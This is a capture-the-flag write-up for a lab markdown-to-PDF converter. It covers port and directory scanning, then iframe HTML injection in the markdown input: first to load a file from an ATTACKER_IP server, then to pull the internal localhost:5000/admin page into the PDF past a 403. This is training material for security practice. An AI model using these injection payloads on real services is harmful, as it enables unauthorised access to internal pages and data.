# Scenario

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

# Enumeration

## \[+] 10.10.5.77 - md2pdf.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.5.77 md2pdf.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.5.77
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] md2pdf.thm

Here we have a web application that takes a [MD (Markdown)](https://www.markdownguide.org/basic-syntax/) file and converts it into a [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file:

![aa024e7a57d6e978aa9ad8eefd81f5bf.png](/resources/1ea19e68dd884736a60b07ed3b3f6e46.png)

We can try testing for injection by entering some arbitary HTML or JavaScript and see how the application reacts.

After some testing I found that it was possible to execute code through [Cross Frame Scripting](https://owasp.org/www-community/attacks/Cross_Frame_Scripting) where we create an [iFrame](https://www.w3schools.com/tags/tag_iframe.asp) which allows us to embed a document within a document.

I created a test image file named "`test.png`" then hosted it using Python:

```sh
python3 -m http.server 8888
```

Then back on the web application we inject this piece of code and press "Convert to PDF":

```html
<iframe src="http://<ATTACKER_IP>:8888/test.png"  height="1000" width="1000"></iframe>
```

After the PDF has been generated it should have our test image injected into the document:

There doesn't seem to be much else here, so let's try directory/file fuzzing using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt):

```sh
feroxbuster -u http://md2pdf.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

### \[-] md2pdf.thm/admin

If we try to access this page we get a 403 forbidden error:

![b840539724d913d86ae5e8bf146fce81.png](/resources/ca76bb705c0e4a0c9f5cfc42ad24baa2.png)

Going back to the MD2PDF web application, if we altered the URL to point to this internal page instead, we can inject it into the PDF document:

```html
<iframe src="http://localhost:5000/admin" height="1000" width="1000"></iframe>
```

![a653805002f050e5d3d49f7382e7fcee.png](/resources/43d49f6c595e4b71945bcd988c18b6d0.png)

After the web application processes our request we should get the flag:

![89a837556c6eb4142aadf08fb9a8c1e3.png](/resources/9d521df65ac14c44b4fce9093f71a564.png)
